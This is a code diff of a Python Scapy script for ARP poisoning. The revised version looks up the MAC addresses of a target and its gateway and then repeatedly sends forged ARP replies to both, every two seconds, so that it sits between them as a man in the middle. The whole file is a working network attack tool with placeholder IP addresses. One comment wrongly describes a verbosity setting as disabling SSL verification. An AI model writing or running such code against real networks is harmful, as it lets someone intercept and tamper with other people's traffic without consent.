@@ -1,27 +1,43 @@
-from scapy.all import *
+from scapy.all import ARP, Ether, send, srp, conf
 import time
 
-# Function to send ARP spoof (poison) packets
-def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac):
-    # Send ARP response to the victim: tell victim that the attacker's MAC address is the gateway's IP
-    target_arp = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
-    send(target_arp, verbose=False)
-    
-    # Send ARP response to the gateway: tell gateway that the attacker's MAC address is the victim's IP
-    gateway_arp = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
-    send(gateway_arp, verbose=False)
+# Disable Scapy's SSL verification
+conf.verb = 0  # Disable verbose output
 
-# Replace these with the actual IP and MAC addresses
-victim_ip = "192.168.1.5"  # Victim's IP
-victim_mac = "00:11:22:33:44:55"  # Victim's MAC address
-gateway_ip, gateway_mac = router_ip_mac.get_router_ip_mac()
-print(router_ip_mac.get_router_ip_mac())
+def arp_poison(target_ip, target_mac, spoof_ip):
+    # Create ARP response packet
+    arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
+    ether = Ether(dst=target_mac) / arp_response
 
-# Continuously poison ARP tables
-try:
-    print("Starting ARP poisoning...")
-    while True:
-        arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac)
-        time.sleep(2)  # Send ARP packets every 2 seconds
-except KeyboardInterrupt:
-    print("\nARP poisoning stopped.")
+    # Send the packet
+    send(ether)
+
+def get_mac(ip):
+    # Send ARP request to get MAC address
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
+    return ans[0][1].hwsrc if ans else None
+
+def main(target_ip, gateway_ip):
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+
+    if target_mac is None or gateway_mac is None:
+        print("Could not find MAC addresses.")
+        return
+
+    print(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
+
+    try:
+        while True:
+            # Poison the target
+            arp_poison(target_ip, target_mac, gateway_ip)
+            # Poison the gateway
+            arp_poison(gateway_ip, gateway_mac, target_ip)
+            time.sleep(2)  # Send every 2 seconds
+    except KeyboardInterrupt:
+        print("ARP poisoning stopped.")
+
+if __name__ == "__main__":
+    target_ip = "192.168.1.10"  # Change to your target's IP
+    gateway_ip = "192.168.1.1"  # Change to your gateway's IP
+    main(target_ip, gateway_ip)
